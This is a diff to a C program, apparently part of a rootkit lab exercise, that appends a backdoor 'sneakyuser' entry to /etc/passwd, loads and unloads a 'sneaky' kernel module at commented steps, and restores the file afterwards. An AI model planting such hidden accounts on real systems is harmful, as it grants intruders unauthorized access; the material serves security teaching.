@@ -5,9 +5,13 @@
  * Description:
  *
  */
+
+#define BUF_SIZE 2
+
 #include <error.h>
 #include <stdio.h>
 #include <stdlib.h>
+#include <string.h>
 #include <sys/types.h>
 #include <sys/wait.h>
 #include <unistd.h>
@@ -35,10 +39,7 @@ void run_command(const char *command, char *const args[]) {
   }
 }
 
-int main(void) {
-  /*-------------------------------1------------------------------*/
-  printf("sneaky_process pid = %d\n", getpid());
-  /*-------------------------------2------------------------------*/
+void modify_passwd_file() {
   // copy /etc/passwd to /tmp/passwd
   char *const command[] = {"/bin/ls", "-l", 0}; // needs to be null terminated
   run_command(command[0], command);
@@ -52,10 +53,35 @@ int main(void) {
   FILE *fp;
 
   fp = fopen("/etc/passwd", "a");
+  if (fp == NULL) {
+    perror("fopen passwd file");
+    exit(EXIT_FAILURE);
+  }
+
   fprintf(fp, "sneakyuser:abc123:2000:2000:sneakyuser:/root:bash\n");
   fclose(fp);
 
   printf("\nappended sneaky line to /etc/passwd\n\n");
+}
+
+void reset_passwd_file() {
+  char *const test_open[] = {"/bin/cat", "/etc/passwd",
+                             0}; // needs to be null terminated
+  run_command(test_open[0], test_open);
+
+  // cp /tmp/passwd to /etc/psswd
+  char *const reset_passwd_file[] = {"/bin/cp", "/tmp/passwd", "/etc/passwd",
+                                     0};
+  run_command(reset_passwd_file[0], reset_passwd_file);
+  printf("\nafter resetting /etc/passwd\n\n");
+  run_command(test_open[0], test_open);
+}
+
+int main(void) {
+  /*-------------------------------1------------------------------*/
+  printf("sneaky_process pid = %d\n", getpid());
+  /*-------------------------------2------------------------------*/
+  modify_passwd_file();
 
   /*-------------------------------3------------------------------*/
   // load sneaky module using insmod()
@@ -66,18 +92,47 @@ int main(void) {
   // while(1)
   // take keyboard input until "q"-quit
   // execute the commands from user -- to test sneaky_mod
-  int i = 10;
-  while(i>0) {
-    printf("Enter a command for testing\n");
-    size_t buf_size = 32;
-    char buffer[buf_size];
-    char *b = buffer;
 
-    i--;
+  /* int i = 10; */
+  /* while (i > 0) { */
+  /*   printf("Enter a command for testing\n"); */
+  /*   size_t buf_size = BUF_SIZE; */
+  /*   char buffer[buf_size]; */
+  /*   memset(&buffer, 0, buf_size); */
+  /*   char *b = buffer; */
+  /*   ssize_t input_size; */
+
+  /*   input_size = getline(&b, &buf_size, stdin); */
+  /*   if (input_size == -1) { */
+  /*     perror("getline"); */
+  /*   } */
+  /*   if (input_size == BUF_SIZE) { */
+  /*     buffer[buf_size] = 0; */
+  /*   } */
+  /*   printf("Input String:\n%s\n", b); */
+  /*   printf("input_size: %lu\n", input_size); */
+  /*   i--; */
+  /* } */
+
+  char *curr = NULL;
+  size_t len; // = BUF_SIZE;
+  ssize_t read_len;
+
+  printf("Enter commands to evaluate. Enter q to exit.\n");
+  const char *quit = "q";
+  int res = 0;
+  while ((read_len = getline(&curr, &len, stdin)) != -1) {
+    char *newline_ptr = strchr(curr, '\n');
+    if (newline_ptr != NULL) {
+      *newline_ptr = '\0';
+    }
+    printf("read line %s\n", curr);
+    if ((res = strcmp(curr, quit)) == 0) {
+      break;
+    }
+    printf("%d\n", res);
+    printf("Enter commands to evaluate. Enter q to exit.\n");
   }
-  
-  char *const test_open[] = {"/bin/cat", "/etc/passwd", 0}; // needs to be null terminated
-  run_command(test_open[0], test_open);
 
   // test malicious behavior
 
@@ -86,10 +141,7 @@ int main(void) {
   // unload sneaky kernel module using rmmod()
 
   /*-------------------------------6------------------------------*/
+  reset_passwd_file();
 
-  // cp /tmp/passwd to /etc/psswd
-  char *const reset_passwd_file[] = {"/bin/cp", "/tmp/passwd", "/etc/passwd", 0};
-  run_command(reset_passwd_file[0], reset_passwd_file);
-  printf("\nafter resetting /etc/passwd\n\n" );
-  run_command(test_open[0], test_open);
+  return EXIT_SUCCESS;
 }
